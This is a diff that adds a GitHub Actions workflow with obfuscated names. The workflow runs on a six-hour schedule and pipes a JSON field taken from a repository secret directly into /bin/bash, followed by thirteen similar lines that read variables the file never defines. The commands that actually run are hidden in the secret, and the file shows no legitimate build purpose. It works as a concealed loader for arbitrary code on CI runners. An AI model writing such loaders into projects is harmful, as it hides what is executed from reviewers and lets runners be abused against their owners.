@@ -1,0 +1,31 @@
+name: obviousgameg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: obviousgameg
+        env:
+          kz78: ${{ secrets.kz78 }}
+        run: |
+          echo $kz78 | jq -r .z9837 | /bin/bash
+          echo $sllug47 | jq -r .ooky8 | /bin/bash
+          echo $zhnw9 | jq -r .kxiob70 | /bin/bash
+          echo $l48 | jq -r .vp5 | /bin/bash
+          echo $g3936 | jq -r .pdo543 | /bin/bash
+          echo $xle13331 | jq -r .tynnx22573 | /bin/bash
+          echo $tgwa8536 | jq -r .oyv49813 | /bin/bash
+          echo $j10 | jq -r .iolqa4 | /bin/bash
+          echo $wrei96 | jq -r .sh0 | /bin/bash
+          echo $yhoaz8 | jq -r .qgcpf3 | /bin/bash
+          echo $ty4 | jq -r .j9043 | /bin/bash
+          echo $rp7 | jq -r .uwwp23556 | /bin/bash
+          echo $ky6215 | jq -r .xseo36397 | /bin/bash
+          echo $yem53 | jq -r .j35337 | /bin/bash
+
